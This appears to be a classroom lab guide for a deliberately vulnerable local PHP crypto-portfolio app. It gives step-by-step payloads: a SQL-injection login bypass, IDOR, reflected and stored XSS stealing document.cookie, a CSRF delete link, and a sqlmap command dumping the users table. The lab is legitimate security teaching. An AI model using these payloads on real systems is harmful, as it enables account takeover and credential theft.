# Crypto Tracker — Testing Guide

Follow the steps in order. One test per vulnerability.

> ⚠️ Broken on purpose, for learning. Run only on your own computer.

---

## Start the app

```bash
cd /Users/tanvir/projects/bubt/cybersecurity
docker compose up -d
```

Open in browser: **http://localhost/crypto-tracker/**

Logins: `admin / admin123` · `alice / password1` · `bob / qwerty`

Reset data anytime (undo any changes):
```bash
docker compose exec -T db mariadb -ucrypto -pcryptopass < crypto-tracker/db.sql
```

---

## Test 1 — SQL Injection (login without a password)

1. Go to **login.php**.
2. Username: `admin' -- `  *(with a space at the end)*
3. Password: `x`
4. Click **Log in**.

✅ You are logged in as **Administrator** — no real password needed.

---

## Test 2 — IDOR (see another user's data)

1. Log in as **bob / qwerty**.
2. In the address bar, go to:
   ```
   http://localhost/crypto-tracker/dashboard.php?user_id=2
   ```

✅ You see **Alice's** portfolio while logged in as Bob.

---

## Test 3 — Reflected XSS (dangerous link)

1. Log in as any user.
2. In the address bar, go to:
   ```
   http://localhost/crypto-tracker/search.php?q=<script>alert(document.cookie)</script>
   ```

✅ A pop-up box appears showing your cookie — the link ran a script.

---

## Test 4 — Stored XSS (trap that stays)

1. Log in → click **Add holding**.
2. Pick any coin, any amount, any buy price.
3. In **Notes**, type this exactly (no quotes inside):
   ```
   <script>alert(document.cookie)</script>
   ```
4. Click **Add holding**.

✅ A pop-up appears on the dashboard — and every time it loads again.

> Use `alert(document.cookie)`, not `alert('hacked')`. The Notes field also goes into
> the database query, so a single quote `'` breaks it with a SQL error. `document.cookie`
> has no quotes, so it works.

---

## Test 5 — CSRF (a link acts as you)

1. Log in as **bob / qwerty**. Note his holdings on the dashboard.
2. In the address bar, go to:
   ```
   http://localhost/crypto-tracker/delete_holding.php?id=3
   ```
3. Go back to the dashboard.

✅ The holding is deleted — with no confirmation and no password.

---

## Test 6 — Plaintext passwords

In the terminal:
```bash
docker compose exec -T db mariadb -ucrypto -pcryptopass crypto_tracker -e "SELECT username, password FROM users;"
```

✅ You see `admin123`, `password1`, `qwerty` — stored in plain text.

---

## Test 7 — sqlmap (auto-steal the database)

In the terminal:
```bash
cd /Users/tanvir/projects/bubt/cybersecurity

SID=$(curl -s -i -c - \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" \
  http://localhost/crypto-tracker/login.php \
  | grep -oiE 'PHPSESSID=[a-z0-9]+' | head -1 | cut -d= -f2)

docker compose run --rm sqlmap \
  -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" --output-dir=/output --batch --dump -T users -D crypto_tracker
```

✅ sqlmap prints all 3 users with their passwords. *(First run takes ~30–60 sec.)*

---

**Reset when done:**
```bash
docker compose exec -T db mariadb -ucrypto -pcryptopass < crypto-tracker/db.sql
```
